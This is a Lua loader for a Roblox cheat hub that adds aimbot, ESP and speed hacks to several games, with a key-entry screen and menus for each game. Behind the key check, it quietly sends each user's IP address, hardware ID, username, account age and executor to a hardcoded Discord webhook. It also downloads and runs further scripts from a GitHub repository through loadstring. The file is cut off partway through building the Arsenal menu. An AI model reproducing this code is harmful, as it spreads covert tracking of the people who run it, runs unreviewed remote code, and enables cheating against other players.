--[[
    InovoProductions Script Hub Loader
    
    Supported Games:
    - Arsenal
    - Prison Life
    - FiveR Roleplay
    
    Load with:
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Loader.lua"))()
]]

-- Check if already loaded
if _G.InovoLoaded then
    warn("[InovoHub] Already loaded!")
    return
end
_G.InovoLoaded = true

-- Service helpers
local rawGetService = game.GetService
local rawFindService = game.FindService

local function fetchService(nameParts)
    local serviceName
    if type(nameParts) == "table" then
        serviceName = table.concat(nameParts)
    else
        serviceName = nameParts
    end

    local ok, service = pcall(rawGetService, game, serviceName)
    if ok and service then
        return service
    end

    ok, service = pcall(rawFindService, game, serviceName)
    if ok and service then
        return service
    end

    return nil
end

-- Services
local TweenService = fetchService({"Tween", "Service"})
local UserInputService = fetchService({"User", "Input", "Service"})
local Players = fetchService("Players")
local CoreGui = fetchService({"Core", "Gui"})
local HttpService = fetchService({"Http", "Service"})
local MarketplaceService = fetchService({"Marketplace", "Service"})
local AnalyticsService = fetchService({"Rbx", "Analytics", "Service"})
local httpRequest = (syn and syn.request) or (http and http.request) or request
math.randomseed(tick() % 1 * 1e6)

local function randomId(prefix)
    local suffix = tostring(math.random(100000, 999999))
    return (prefix or "Inovo") .. "_" .. suffix
end

local function safeHttpGet(url)
    if type(game.HttpGet) ~= "function" then
        return nil
    end

    local ok, response = pcall(game.HttpGet, game, url)
    if ok then
        return response
    end

    return nil
end

local function fetchRemote(url)
    local body = safeHttpGet(url)
    if body and #body > 0 then
        return body
    end

    if httpRequest then
        local ok, response = pcall(httpRequest, {
            Url = url,
            Method = "GET"
        })

        if ok and response and response.StatusCode == 200 and response.Body then
            return response.Body
        end
    end

    return nil
end

-- Configuration
local CORRECT_KEY = "inovoproductionsv1"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1430600012559286383/Jfbygbw1VA3tF5_p14iPc5UE_Xi0rml0VBElb98V6PaPgR2MMi-LstSDHURxjk1iLnX7"

-- Get User Info
local LocalPlayer = Players.LocalPlayer
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Get HWID (Hardware ID)
local function getHWID()
    if gethwid then
        return gethwid()
    end

    if AnalyticsService and AnalyticsService.GetClientId then
        local ok, hwid = pcall(AnalyticsService.GetClientId, AnalyticsService)
        if ok and hwid then
            return hwid
        end
    end

    return "Unknown"
end

-- Get IP Address
local function getIPAddress()
    if not HttpService then
        return "Unknown"
    end

    local success, result = pcall(function()
        local response = safeHttpGet("https://api.ipify.org?format=json")
        if not response then
            return "Unknown"
        end

        local data = HttpService:JSONDecode(response)
        return data.ip or "Unknown"
    end)
    return success and result or "Unknown"
end


-- Send to Discord Webhook
local function sendToWebhook(key_correct)
    if not HttpService then
        return
    end

    local hwid = getHWID()
    local ip = getIPAddress()
    local username = LocalPlayer.Name
    local userid = LocalPlayer.UserId
    local displayname = LocalPlayer.DisplayName
    local accountage = LocalPlayer.AccountAge

    local status = key_correct and "Key Correct" or "Key Incorrect"
    local color = key_correct and 3066993 or 15158332

    local gameName = "Unknown"
    if MarketplaceService and MarketplaceService.GetProductInfo then
        local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
        if ok and info and info.Name then
            gameName = info.Name
        end
    end

    local embed = {
        ["embeds"] = {{
            ["title"] = "InovoProductions Hub - Login Attempt",
            ["description"] = "**Status:** " .. status,
            ["color"] = color,
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = username .. " (@" .. displayname .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = tostring(userid),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = tostring(accountage) .. " days",
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = "```" .. tostring(hwid) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "IP Address",
                    ["value"] = "```" .. tostring(ip) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Executor",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game",
                    ["value"] = gameName,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "InovoProductions Security System"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }

    local data = HttpService:JSONEncode(embed)

    if not httpRequest then
        return
    end

    task.defer(function()
        pcall(function()
            httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = data
            })
        end)
    end)
end

local function loadImageAsset(fileName, url)
    if not (getCustomAsset and writefile and isfile and isfolder and makefolder) then
        return nil
    end

    local baseFolder = "InovoHub"
    local imageFolder = baseFolder .. "/Images"

    local ok = pcall(function()
        if not isfolder(baseFolder) then
            makefolder(baseFolder)
        end
        if not isfolder(imageFolder) then
            makefolder(imageFolder)
        end
    end)

    if not ok then
        return nil
    end

    local filePath = imageFolder .. "/" .. fileName
    if not isfile(filePath) then
        local remoteBody = fetchRemote(url)
        if not remoteBody then
            return nil
        end

        local wrote = pcall(function()
            writefile(filePath, remoteBody)
        end)

        if not wrote then
            return nil
        end
    end

    local success, asset = pcall(function()
        return getCustomAsset(filePath)
    end)

    if success then
        return asset
    end

    return nil
end

-- Load Library
local libSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/InovoLib.lua")
if not libSource then
    warn("[InovoHub] Failed to load UI library.")
    return
end
local InovoLib = loadstring(libSource)()
-- Create Key System GUI
local keyScreenGui = Instance.new("ScreenGui")
keyScreenGui.Name = randomId("InovoKey")
keyScreenGui.ResetOnSpawn = false
keyScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
keyScreenGui.Parent = CoreGui

local keyFrame = Instance.new("Frame")
keyFrame.Name = randomId("KeyFrame")
keyFrame.Size = UDim2.new(0, 480, 0, 280)
keyFrame.Position = UDim2.new(0.5, -240, 0.5, -140)
keyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
keyFrame.BorderSizePixel = 0
keyFrame.Parent = keyScreenGui

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 12)
keyCorner.Parent = keyFrame

local keyAccent = Instance.new("Frame")
keyAccent.Size = UDim2.new(1, 0, 0, 4)
keyAccent.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
keyAccent.BorderSizePixel = 0
keyAccent.Parent = keyFrame

local keyHeader = Instance.new("Frame")
keyHeader.Name = randomId("KeyHeader")
keyHeader.Size = UDim2.new(1, 0, 0, 60)
keyHeader.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
keyHeader.BorderSizePixel = 0
keyHeader.Parent = keyFrame

local keyHeaderCorner = Instance.new("UICorner")
keyHeaderCorner.CornerRadius = UDim.new(0, 12)
keyHeaderCorner.Parent = keyHeader

local keyHeaderPadding = Instance.new("UIPadding")
keyHeaderPadding.PaddingLeft = UDim.new(0, 20)
keyHeaderPadding.PaddingRight = UDim.new(0, 60)
keyHeaderPadding.Parent = keyHeader

local keyTitle = Instance.new("TextLabel")
keyTitle.Size = UDim2.new(1, 0, 1, 0)
keyTitle.BackgroundTransparency = 1
keyTitle.Text = "InovoProductions - Key System"
keyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
keyTitle.TextSize = 20
keyTitle.Font = Enum.Font.GothamBold
keyTitle.TextXAlignment = Enum.TextXAlignment.Left
keyTitle.Parent = keyHeader

local keyCloseBtn = Instance.new("TextButton")
keyCloseBtn.Size = UDim2.new(0, 40, 0, 40)
keyCloseBtn.AnchorPoint = Vector2.new(1, 0.5)
keyCloseBtn.Position = UDim2.new(1, -20, 0.5, 0)
keyCloseBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
keyCloseBtn.BorderSizePixel = 0
keyCloseBtn.Text = "X"
keyCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyCloseBtn.TextSize = 18
keyCloseBtn.Font = Enum.Font.GothamBold
keyCloseBtn.Parent = keyHeader

local keyCloseCorner = Instance.new("UICorner")
keyCloseCorner.CornerRadius = UDim.new(0, 8)
keyCloseCorner.Parent = keyCloseBtn

keyCloseBtn.MouseButton1Click:Connect(function()
    _G.InovoLoaded = nil
    keyScreenGui:Destroy()
end)
local keyContent = Instance.new("Frame")
keyContent.Size = UDim2.new(1, -40, 1, -100)
keyContent.Position = UDim2.new(0, 20, 0, 80)
keyContent.BackgroundTransparency = 1
keyContent.Parent = keyFrame

local keySubtitle = Instance.new("TextLabel")
keySubtitle.Size = UDim2.new(1, 0, 0, 24)
keySubtitle.BackgroundTransparency = 1
keySubtitle.Text = "Voer je toegangscode in om verder te gaan."
keySubtitle.TextColor3 = Color3.fromRGB(190, 190, 200)
keySubtitle.TextSize = 14
keySubtitle.Font = Enum.Font.Gotham
keySubtitle.TextXAlignment = Enum.TextXAlignment.Left
keySubtitle.Parent = keyContent

local keyHelp = Instance.new("TextLabel")
keyHelp.Size = UDim2.new(1, 0, 0, 20)
keyHelp.Position = UDim2.new(0, 0, 0, 26)
keyHelp.BackgroundTransparency = 1
keyHelp.Text = "Geen key? Ga naar onze Discord voor meer informatie."
keyHelp.TextColor3 = Color3.fromRGB(120, 120, 135)
keyHelp.TextSize = 13
keyHelp.Font = Enum.Font.Gotham
keyHelp.TextXAlignment = Enum.TextXAlignment.Left
keyHelp.Parent = keyContent

local keyDragging = false
local keyDragInput, keyMousePos, keyFramePos

keyHeader.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        keyDragging = true
        keyMousePos = input.Position
        keyFramePos = keyFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                keyDragging = false
            end
        end)
    end
end)

keyHeader.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        keyDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == keyDragInput and keyDragging then
        local delta = input.Position - keyMousePos
        keyFrame.Position = UDim2.new(
            keyFramePos.X.Scale,
            keyFramePos.X.Offset + delta.X,
            keyFramePos.Y.Scale,
            keyFramePos.Y.Offset + delta.Y
        )
    end
end)

local keyInput = Instance.new("TextBox")
keyInput.Size = UDim2.new(1, 0, 0, 45)
keyInput.Position = UDim2.new(0, 0, 0, 70)
keyInput.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
keyInput.BorderSizePixel = 0
keyInput.Text = ""
keyInput.PlaceholderText = "Voer jouw key in"
keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
keyInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 135)
keyInput.TextSize = 16
keyInput.Font = Enum.Font.GothamSemibold
keyInput.ClearTextOnFocus = false
keyInput.Parent = keyContent

local keyInputCorner = Instance.new("UICorner")
keyInputCorner.CornerRadius = UDim.new(0, 8)
keyInputCorner.Parent = keyInput

local keyInputStroke = Instance.new("UIStroke")
keyInputStroke.Color = Color3.fromRGB(60, 60, 75)
keyInputStroke.Thickness = 1
keyInputStroke.Parent = keyInput

local keyInputPadding = Instance.new("UIPadding")
keyInputPadding.PaddingLeft = UDim.new(0, 15)
keyInputPadding.PaddingRight = UDim.new(0, 15)
keyInputPadding.Parent = keyInput

local submitBtn = Instance.new("TextButton")
submitBtn.Size = UDim2.new(1, 0, 0, 45)
submitBtn.Position = UDim2.new(0, 0, 0, 130)
submitBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
submitBtn.BorderSizePixel = 0
submitBtn.Text = "Verify Key"
submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
submitBtn.TextSize = 16
submitBtn.Font = Enum.Font.GothamBold
submitBtn.Parent = keyContent

local submitBtnCorner = Instance.new("UICorner")
submitBtnCorner.CornerRadius = UDim.new(0, 8)
submitBtnCorner.Parent = submitBtn

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 0, 185)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(240, 71, 71)
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = keyContent

submitBtn.MouseEnter:Connect(function()
    TweenService:Create(submitBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(108, 121, 255)}):Play()
end)

submitBtn.MouseLeave:Connect(function()
    TweenService:Create(submitBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
end)
-- Key Verification
local function verifyKey()
    local enteredKey = keyInput.Text
    
    if enteredKey == "" then
        statusLabel.TextColor3 = Color3.fromRGB(250, 166, 26)
        statusLabel.Text = "Voer eerst een key in."
        return
    end
    
    submitBtn.Text = "Verifying..."
    submitBtn.Active = false
    
    task.wait(0.5)
    
    if enteredKey == CORRECT_KEY then
        statusLabel.TextColor3 = Color3.fromRGB(67, 181, 129)
        statusLabel.Text = "Key geaccepteerd! Laden..."
        
        -- Send success webhook
        sendToWebhook(true)
        
        task.wait(1)
        keyScreenGui:Destroy()
        
        -- Load main GUI
        loadMainGUI()
    else
        statusLabel.TextColor3 = Color3.fromRGB(240, 71, 71)
        statusLabel.Text = "Ongeldige key, probeer opnieuw."
        
        -- Send failed webhook
        sendToWebhook(false)
        
        submitBtn.Text = "Verify Key"
        submitBtn.Active = true
        keyInput.Text = ""
    end
end

submitBtn.MouseButton1Click:Connect(verifyKey)
keyInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        verifyKey()
    end
end)

-- Main GUI Function
function loadMainGUI()
    -- Create Main Selection GUI (NO TABS!)
    local screenGui = Instance.new("ScreenGui")
screenGui.Name = randomId("InovoMenu")
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = CoreGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = randomId("MainContainer")
mainFrame.Size = UDim2.new(0, 720, 0, 400)
mainFrame.Position = UDim2.new(0.5, -360, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
title.BorderSizePixel = 0
title.Text = "InovoProductions - Select Game"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = title

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = mainFrame

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 8)
closeBtnCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Make Draggable
local dragging = false
local dragInput, mousePos, framePos

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        mousePos = input.Position
        framePos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        mainFrame.Position = UDim2.new(
            framePos.X.Scale,
            framePos.X.Offset + delta.X,
            framePos.Y.Scale,
            framePos.Y.Offset + delta.Y
        )
    end
end)

-- Arsenal Button
local arsenalBtn = Instance.new("TextButton")
arsenalBtn.Size = UDim2.new(0, 200, 0, 250)
arsenalBtn.Position = UDim2.new(0, 40, 0, 90)
arsenalBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
arsenalBtn.BorderSizePixel = 0
arsenalBtn.Text = ""
arsenalBtn.Parent = mainFrame

local arsenalCorner = Instance.new("UICorner")
arsenalCorner.CornerRadius = UDim.new(0, 10)
arsenalCorner.Parent = arsenalBtn

-- Arsenal Image (placeholder with gradient)
local arsenalImg = Instance.new("Frame")
arsenalImg.Size = UDim2.new(1, -20, 0, 150)
arsenalImg.Position = UDim2.new(0, 10, 0, 10)
arsenalImg.BackgroundColor3 = Color3.fromRGB(230, 70, 70)
arsenalImg.BorderSizePixel = 0
arsenalImg.Parent = arsenalBtn

local arsenalImgCorner = Instance.new("UICorner")
arsenalImgCorner.CornerRadius = UDim.new(0, 8)
arsenalImgCorner.Parent = arsenalImg

local arsenalGrad = Instance.new("UIGradient")
arsenalGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 70, 70)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 50, 50))
}
arsenalGrad.Rotation = 45
arsenalGrad.Parent = arsenalImg

-- Arsenal Icon Text  
local arsenalIcon = Instance.new("TextLabel")
arsenalIcon.Size = UDim2.new(1, 0, 1, 0)
arsenalIcon.BackgroundTransparency = 1
arsenalIcon.Text = "A"
arsenalIcon.TextSize = 60
arsenalIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
arsenalIcon.Parent = arsenalImg

-- Try to load actual Arsenal image
local arsenalActualImg = Instance.new("ImageLabel")
arsenalActualImg.Size = UDim2.new(1, 0, 1, 0)
arsenalActualImg.BackgroundTransparency = 1
arsenalActualImg.ScaleType = Enum.ScaleType.Crop
arsenalActualImg.ZIndex = 2
local arsenalImageAsset = loadImageAsset("arsenal.png", "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/image.png")
if arsenalImageAsset then
    arsenalActualImg.Image = arsenalImageAsset
    arsenalActualImg.Parent = arsenalImg
    arsenalIcon.Visible = false
else
    local fallbackUrl = "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/image.png"
    local success = pcall(function()
        arsenalActualImg.Image = fallbackUrl
    end)
    if success then
        arsenalActualImg.Parent = arsenalImg
        arsenalIcon.Visible = false
    else
        arsenalActualImg:Destroy()
    end
end

-- Arsenal Label
local arsenalLabel = Instance.new("TextLabel")
arsenalLabel.Size = UDim2.new(1, 0, 0, 80)
arsenalLabel.Position = UDim2.new(0, 0, 1, -80)
arsenalLabel.BackgroundTransparency = 1
arsenalLabel.Text = "ARSENAL"
arsenalLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
arsenalLabel.TextSize = 24
arsenalLabel.Font = Enum.Font.GothamBold
arsenalLabel.Parent = arsenalBtn

-- Prison Life Button
local prisonBtn = Instance.new("TextButton")
prisonBtn.Size = UDim2.new(0, 200, 0, 250)
prisonBtn.Position = UDim2.new(0, 260, 0, 90)
prisonBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
prisonBtn.BorderSizePixel = 0
prisonBtn.Text = ""
prisonBtn.Parent = mainFrame

local prisonCorner = Instance.new("UICorner")
prisonCorner.CornerRadius = UDim.new(0, 10)
prisonCorner.Parent = prisonBtn

-- Prison Life Image (placeholder with gradient)
local prisonImg = Instance.new("Frame")
prisonImg.Size = UDim2.new(1, -20, 0, 150)
prisonImg.Position = UDim2.new(0, 10, 0, 10)
prisonImg.BackgroundColor3 = Color3.fromRGB(70, 140, 230)
prisonImg.BorderSizePixel = 0
prisonImg.Parent = prisonBtn

local prisonImgCorner = Instance.new("UICorner")
prisonImgCorner.CornerRadius = UDim.new(0, 8)
prisonImgCorner.Parent = prisonImg

local prisonGrad = Instance.new("UIGradient")
prisonGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 140, 230)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 100, 180))
}
prisonGrad.Rotation = 45
prisonGrad.Parent = prisonImg

-- Prison Icon Text
local prisonIcon = Instance.new("TextLabel")
prisonIcon.Size = UDim2.new(1, 0, 1, 0)
prisonIcon.BackgroundTransparency = 1
prisonIcon.Text = "P"
prisonIcon.TextSize = 60
prisonIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
prisonIcon.Parent = prisonImg

-- Try to load actual Prison Life image
local prisonActualImg = Instance.new("ImageLabel")
prisonActualImg.Size = UDim2.new(1, 0, 1, 0)
prisonActualImg.BackgroundTransparency = 1
prisonActualImg.ScaleType = Enum.ScaleType.Crop
prisonActualImg.ZIndex = 2
local prisonImageAsset = loadImageAsset("prison-life.jpg", "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/images.jpg")
if prisonImageAsset then
    prisonActualImg.Image = prisonImageAsset
    prisonActualImg.Parent = prisonImg
    prisonIcon.Visible = false
else
    local fallbackUrl = "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/images.jpg"
    local success = pcall(function()
        prisonActualImg.Image = fallbackUrl
    end)
    if success then
        prisonActualImg.Parent = prisonImg
        prisonIcon.Visible = false
    else
        prisonActualImg:Destroy()
    end
end

-- Prison Life Label
local prisonLabel = Instance.new("TextLabel")
prisonLabel.Size = UDim2.new(1, 0, 0, 80)
prisonLabel.Position = UDim2.new(0, 0, 1, -80)
prisonLabel.BackgroundTransparency = 1
prisonLabel.Text = "PRISON LIFE"
prisonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
prisonLabel.TextSize = 24
prisonLabel.Font = Enum.Font.GothamBold
prisonLabel.Parent = prisonBtn

-- FiveR Button
local fiverBtn = Instance.new("TextButton")
fiverBtn.Size = UDim2.new(0, 200, 0, 250)
fiverBtn.Position = UDim2.new(0, 480, 0, 90)
fiverBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
fiverBtn.BorderSizePixel = 0
fiverBtn.Text = ""
fiverBtn.Parent = mainFrame

local fiverCorner = Instance.new("UICorner")
fiverCorner.CornerRadius = UDim.new(0, 10)
fiverCorner.Parent = fiverBtn

-- FiveR Image (placeholder with gradient)
local fiverImg = Instance.new("Frame")
fiverImg.Size = UDim2.new(1, -20, 0, 150)
fiverImg.Position = UDim2.new(0, 10, 0, 10)
fiverImg.BackgroundColor3 = Color3.fromRGB(255, 170, 80)
fiverImg.BorderSizePixel = 0
fiverImg.Parent = fiverBtn

local fiverImgCorner = Instance.new("UICorner")
fiverImgCorner.CornerRadius = UDim.new(0, 8)
fiverImgCorner.Parent = fiverImg

local fiverGrad = Instance.new("UIGradient")
fiverGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 170, 80)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 90, 60))
}
fiverGrad.Rotation = 45
fiverGrad.Parent = fiverImg

-- FiveR Icon Text
local fiverIcon = Instance.new("TextLabel")
fiverIcon.Size = UDim2.new(1, 0, 1, 0)
fiverIcon.BackgroundTransparency = 1
fiverIcon.Text = "F"
fiverIcon.TextSize = 60
fiverIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
fiverIcon.Parent = fiverImg

-- Try to load actual FiveR image (optional)
local fiverActualImg = Instance.new("ImageLabel")
fiverActualImg.Size = UDim2.new(1, 0, 1, 0)
fiverActualImg.BackgroundTransparency = 1
fiverActualImg.ScaleType = Enum.ScaleType.Crop
fiverActualImg.ZIndex = 2
local fiverImageAsset = loadImageAsset("fiver.png", "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/fiver.png")
if fiverImageAsset then
    fiverActualImg.Image = fiverImageAsset
    fiverActualImg.Parent = fiverImg
    fiverIcon.Visible = false
else
    local fallbackUrl = "https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/fiver.png"
    local success = pcall(function()
        fiverActualImg.Image = fallbackUrl
    end)
    if success then
        fiverActualImg.Parent = fiverImg
        fiverIcon.Visible = false
    else
        fiverActualImg:Destroy()
    end
end

-- FiveR Label
local fiverLabel = Instance.new("TextLabel")
fiverLabel.Size = UDim2.new(1, 0, 0, 80)
fiverLabel.Position = UDim2.new(0, 0, 1, -80)
fiverLabel.BackgroundTransparency = 1
fiverLabel.Text = "Fiver Roleplay"
fiverLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fiverLabel.TextSize = 24
fiverLabel.Font = Enum.Font.GothamBold
fiverLabel.Parent = fiverBtn

-- Hover effects
arsenalBtn.MouseEnter:Connect(function()
    TweenService:Create(arsenalBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
end)

arsenalBtn.MouseLeave:Connect(function()
    TweenService:Create(arsenalBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
end)

prisonBtn.MouseEnter:Connect(function()
    TweenService:Create(prisonBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
end)

prisonBtn.MouseLeave:Connect(function()
    TweenService:Create(prisonBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
end)

fiverBtn.MouseEnter:Connect(function()
    TweenService:Create(fiverBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
end)

fiverBtn.MouseLeave:Connect(function()
    TweenService:Create(fiverBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
end)

-- Arsenal Click
arsenalBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    task.wait(0.1)
    
    -- Load Arsenal
    local arsenalSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/Arsenal.lua")
    if not arsenalSource then
        warn("[InovoHub] Failed to load Arsenal script.")
        return
    end
    local arsenalChunk = loadstring(arsenalSource)
    if not arsenalChunk then
        warn("[InovoHub] Could not compile Arsenal script.")
        return
    end
    local Arsenal = arsenalChunk()
    if type(Arsenal) ~= "table" or not Arsenal.Init then
        warn("[InovoHub] Arsenal script returned unexpected result.")
        return
    end
    Arsenal:Init()
    
    local Window = InovoLib:CreateWindow({
        Title = "InovoProductions | Arsenal",
        Size = UDim2.new(0, 650, 0, 550)
    })
    
    local CombatTab = Window:CreateTab("Combat")
    local VisualsTab = Window:CreateTab("Visuals")
    local MovementTab = Window:CreateTab("Movement")
    local MiscTab = Window:CreateTab("Misc")
    
    -- Combat Tab
    CombatTab:AddLabel("Aimbot Settings")
    CombatTab:AddDivider()
    
    CombatTab:AddToggle({
        Text = "Enable Aimbot",
        Default = false,
        Callback = function(value)
            Arsenal.Settings.Aimbot.Enabled = value
        end
    })
    
    CombatTab:AddToggle({
        Text = "Team Check",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.Aimbot.TeamCheckAimbot = value
        end
    })
    
    CombatTab:AddToggle({
        Text = "Visible Check",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.Aimbot.VisibleCheck = value
        end
    })
    
    CombatTab:AddToggle({
        Text = "Show FOV Circle",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.Aimbot.ShowFOV = value
        end
    })
    
    CombatTab:AddSlider({
        Text = "FOV Size",
        Min = 10,
        Max = 500,
        Default = 100,
        Increment = 5,
        Callback = function(value)
            Arsenal.Settings.Aimbot.FOV = value
        end
    })
    
    CombatTab:AddSlider({
        Text = "Smoothness",
        Min = 1,
        Max = 20,
        Default = 5,
        Increment = 1,
        Callback = function(value)
            Arsenal.Settings.Aimbot.Smoothness = value
        end
    })
    
    CombatTab:AddDropdown({
        Text = "Aim Part",
        Items = {"Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"},
        Default = "Head",
        Callback = function(value)
            Arsenal.Settings.Aimbot.AimPart = value
        end
    })
    
    -- Visuals Tab
    VisualsTab:AddLabel("ESP Settings")
    VisualsTab:AddDivider()
    
    VisualsTab:AddToggle({
        Text = "Enable ESP",
        Default = false,
        Callback = function(value)
            Arsenal.Settings.ESP.Enabled = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Box",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.ESP.ShowBox = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Name",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.ESP.ShowName = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Distance",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.ESP.ShowDistance = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Show Health Bar",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.ESP.ShowHealthBar = value
        end
    })
    
    VisualsTab:AddToggle({
        Text = "Team Check",
        Default = true,
        Callback = function(value)
            Arsenal.Settings.ESP.TeamCheckESP = value
        end
    })
    
    -- Movement Tab
    MovementTab:AddLabel("Movement Settings")
    MovementTab:AddDivider()
    
    MovementTab:AddToggle({
        Text = "Custom Speed",
        Default = false,
        Callback = function(value)
            Arsenal.Settings.Movement.SpeedEnabled = value
        end
    })
    
    MovementTab:AddSlider({
        Text = "Walk Speed",
        Min = 16,
        Max = 200,
        Default = 16,
        Increment = 2,
        Callback = function(value)
            Arsenal.Settings.Movement.Speed = value
        end
    })
    
